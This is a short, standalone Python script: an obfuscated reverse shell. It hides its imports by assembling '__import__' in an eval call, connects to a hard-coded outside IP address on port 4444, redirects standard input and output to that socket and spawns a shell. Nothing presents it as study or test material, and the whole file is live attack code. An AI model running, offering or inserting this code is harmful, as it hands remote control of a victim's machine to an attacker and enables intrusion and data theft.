#!/usr/bin/env python3
import socket
load_module = eval('__im' + 'port__')

os = load_module('os')
pty = load_module('pty')

s=socket.socket();s.connect(("152.228.138.134",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")

#except socket.gaierror
#socket.gethostbyname
